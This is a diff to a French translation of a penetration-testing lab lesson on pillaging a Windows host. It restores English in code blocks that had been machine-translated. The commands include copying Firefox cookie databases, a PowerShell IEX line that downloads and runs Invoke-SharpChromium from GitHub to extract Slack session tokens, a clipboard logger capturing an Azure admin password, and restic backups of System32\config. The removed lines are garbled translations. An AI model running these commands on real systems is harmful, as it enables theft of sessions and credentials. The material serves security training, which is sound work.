@@ -264,7 +264,7 @@ Firefox enregistre les cookies dans une base de données SQLite dans un fichier 
 Copier la base de données des cookies de Firefox
 
 ```
-PS C:\htb> copier $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
+PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
 
 ```
 
@@ -320,18 +320,18 @@ PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc
 arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
 PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"
 
-[*] Début de l'extraction de Google Chrome.
+[*] Beginning Google Chrome extraction.
 
-[X] Exception : Impossible de trouver le fichier "C:\Users\lab_admin\AppData\Local\Google\Chrome\User Data\\Default\Cookies".
+[X] Exception: Could not find file 'C:\Users\lab_admin\AppData\Local\Google\Chrome\User Data\\Default\Cookies'.
 
-    à System.IO.__Error.WinIOError (Int32 errorCode, chaîne peut-êtreFullPath)
-    à System.IO.File.InternalCopy(String sourceFileName, String destFileName, Boolean overwrite, Boolean checkout)
-    à Utils.FileUtils.CreateTempDuplicateFile(String filePath)
-    à SharpChromium.ChromiumCredentialManager.GetCookies()
-    à SharpChromium.Program.extract data(String path, String browser)
-[*] Extraction Google Chrome terminée.
+   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
+   at System.IO.File.InternalCopy(String sourceFileName, String destFileName, Boolean overwrite, Boolean checkout)
+   at Utils.FileUtils.CreateTempDuplicateFile(String filePath)
+   at SharpChromium.ChromiumCredentialManager.GetCookies()
+   at SharpChromium.Program.extract data(String path, String browser)
+[*] Finished Google Chrome extraction.
 
-[*] Fait.
+[*] Done.
 
 ```
 
@@ -359,49 +359,48 @@ Extraction de cookies Invoke-SharpChromium
 ```
 PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"
 
-[*] Début de l'extraction de Google Chrome.
+[*] Beginning Google Chrome extraction.
 
---- Cookie Chrome (Utilisateur : lab_admin) ---
-Domaine : slack.com
+--- Chromium Cookie (User: lab_admin) ---
+Domain         : slack.com
 Cookies (JSON) :
 [
 
 <SNIP>
 
 {
-     "domain": ".slack.com",
-     "date d'expiration": 1974643257.67155,
-     "hostOnly": faux,
-     "httpOnly": vrai,
-     "nommé",
-     "chemin": "/",
-     "sameSite": "laxiste",
-     "sécurisé": vrai,
-     "session": faux,
-     "storeId": nul,
-     "valeur": "xoxd-5KK4K2RK2ZLs2sISUEBGUTxLO0dRD8y1wr0Mvst%2Bm7Vy24yiEC3NnxQra8uw6IYh2Q9prDawms%2FG72og092YE0URsfXzxHizC2OAGyzmIzh2j1JoMZNdoOaI9DpJ1Dlq rv8rORsOorRW4hnygmdR59w9Kl%2BLzXQshYIM4hJZgPktT0WOrXV83hNetYg%3D%3D"
+    "domain": ".slack.com",
+    "expirationDate": 1974643257.67155,
+    "hostOnly": false,
+    "httpOnly": true,
+    "name": "d",
+    "path": "/",
+    "sameSite": "lax",
+    "secure": true,
+    "session": false,
+    "storeId": null,
+    "value": "xoxd-5KK4K2RK2ZLs2sISUEBGUTxLO0dRD8y1wr0Mvst%2Bm7Vy24yiEC3NnxQra8uw6IYh2Q9prDawms%2FG72og092YE0URsfXzxHizC2OAGyzmIzh2j1JoMZNdoOaI9DpJ1Dlqrv8rORsOoRW4hnygmdR59w9Kl%2BLzXQshYIM4hJZgPktT0WOrXV83hNeTYg%3D%3D"
 },
 {
-     "domain": ".slack.com",
-     "hostOnly": faux,
-     "httpOnly": vrai,
-     "nom": "d-s",
-     "chemin": "/",
-     "sameSite": "laxiste",
-     "sécurisé": vrai,
-     "session": vrai,
-     "storeId": nul,
-     "valeur": "1659023172"
+    "domain": ".slack.com",
+    "hostOnly": false,
+    "httpOnly": true,
+    "name": "d-s",
+    "path": "/",
+    "sameSite": "lax",
+    "secure": true,
+    "session": true,
+    "storeId": null,
+    "value": "1659023172"
 },
 
 <SNIP>
 
 ]
 
-[*] Extraction Google Chrome terminée.
+[*] Finished Google Chrome extraction.
 
-[*] Fait.
-
+[*] Done.
 ```
 
 Nous pouvons maintenant utiliser ce cookie avec cookie-editor comme nous l'avons fait avec Firefox.
@@ -438,7 +437,7 @@ PS C:\htb> Invoke-ClipboardLogger
 
 https://portal.azure.com
 
-Administrateur@quelquechose.com
+Administrator@something.com
 
 Sup9rC0mpl2xPa$$ws0921lk
 
@@ -482,21 +481,20 @@ Nous devons d'abord créer et initialiser l'emplacement où notre sauvegarde ser
 restic - Initialiser le répertoire de sauvegarde
 
 ```
-PS C:\htb> mkdir E:\restic2 ; restic.exe -r E:\restic2 init
+PS C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init
 
-     Annuaire : E :
+    Directory: E:\
 
-Mode LastWriteTime Longueur Nom
----- ------------- ------ ----
-j----- 09/08/2022 14:16 restic2
-entrez le mot de passe pour le nouveau référentiel :
-entrez à nouveau le mot de passe :
-créé le référentiel restic fdb2e6dd1d à E:\restic2
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          8/9/2022   2:16 PM                restic2
+enter password for new repository:
+enter password again:
+created restic repository fdb2e6dd1d at E:\restic2
 
-Veuillez noter que la connaissance de votre mot de passe est nécessaire pour accéder
-le référentiel. La perte de votre mot de passe signifie que vos données sont
-irrémédiablement perdu.
-
+Please note that knowledge of your password is required to access
+the repository. Losing your password means that your data is
+irrecoverably lost.
 ```
 
 Ensuite, nous pouvons créer notre première sauvegarde.
@@ -506,19 +504,19 @@ Ensuite, nous pouvons créer notre première sauvegarde.
 restic - Sauvegarder un répertoire
 
 ```
-PS C:\htb> $env:RESTIC_PASSWORD = 'Mot de passe'
+PS C:\htb> $env:RESTIC_PASSWORD = 'Password'
 PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder
 
-dépôt fdb2e6dd ouvert avec succès, le mot de passe est correct
-créé un nouveau cache dans C:\Users\jeff\AppData\Local\restic
-aucun instantané parent trouvé, lira tous les fichiers
+repository fdb2e6dd opened successfully, password is correct
+created new cache in C:\Users\jeff\AppData\Local\restic
+no parent snapshot found, will read all files
 
-Fichiers : 1 nouveau, 0 modifié, 0 non modifié
-Dirs : 2 nouveaux, 0 modifiés, 0 non modifiés
-Ajouté au dépôt : 927 B
+Files:           1 new,     0 changed,     0 unmodified
+Dirs:            2 new,     0 changed,     0 unmodified
+Added to the repo: 927 B
 
-traité 1 fichiers, 22 B en 0:00
-instantané 9971e881 enregistré
+processed 1 files, 22 B in 0:00
+snapshot 9971e881 saved
 
 ```
 
@@ -531,19 +529,19 @@ restic - Sauvegarder un répertoire avec VSS
 ```
 PS C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
 
-dépôt fdb2e6dd ouvert avec succès, le mot de passe est correct
-aucun instantané parent trouvé, lira tous les fichiers
-création d'un instantané VSS pour [c:\]
-instantané créé avec succès pour [c:\]
-erreur : Ouvrir : ouvrez \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config : l'accès est refusé.
+repository fdb2e6dd opened successfully, password is correct
+no parent snapshot found, will read all files
+creating VSS snapshot for [c:\]
+successfully created snapshot for [c:\]
+error: Open: open \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config: Access is denied.
 
-Fichiers : 0 nouveaux, 0 modifiés, 0 non modifiés
-Dirs : 3 nouveaux, 0 modifiés, 0 non modifiés
-Ajouté au dépôt : 914 B
+Files:           0 new,     0 changed,     0 unmodified
+Dirs:            3 new,     0 changed,     0 unmodified
+Added to the repo: 914 B
 
-traité 0 fichiers, 0 B en 0:02
-instantané b0b6f4bb enregistré
-Attention : au moins un fichier source n'a pas pu être lu
+processed 0 files, 0 B in 0:02
+snapshot b0b6f4bb saved
+Warning: at least one source file could not be read
 
 ```
 
@@ -556,17 +554,16 @@ Nous pouvons également vérifier quelles sauvegardes sont enregistrées dans le
 restic - Vérifier les sauvegardes enregistrées dans un référentiel
 
 ```
-PS C:\htb> restic.exe -r E:\restic2\ instantanés
+PS C:\htb> restic.exe -r E:\restic2\ snapshots
 
-dépôt fdb2e6dd ouvert avec succès, le mot de passe est correct
-ID Heure Hôte Balises Chemins
--------------------------------------------------- -----------------------------------------
-9971e881 2022-08-09 14:18:59 PILLAGING-WIN01 C:\SampleFolder
-b0b6f4bb 2022-08-09 14:19:41 PILLAGE-WIN01 C:\Windows\System32\config
-afba3e9c 2022-08-09 14:35:25 PILLAGING-WIN01 C:\Users\jeff\Documents
--------------------------------------------------- -----------------------------------------
-3 instantanés
-
+repository fdb2e6dd opened successfully, password is correct
+ID        Time                 Host             Tags        Paths
+--------------------------------------------------------------------------------------
+9971e881  2022-08-09 14:18:59  PILLAGING-WIN01              C:\SampleFolder
+b0b6f4bb  2022-08-09 14:19:41  PILLAGING-WIN01              C:\Windows\System32\config
+afba3e9c  2022-08-09 14:35:25  PILLAGING-WIN01              C:\Users\jeff\Documents
+--------------------------------------------------------------------------------------
+3 snapshots
 ```
 
 Nous pouvons restaurer une sauvegarde en utilisant l'ID.
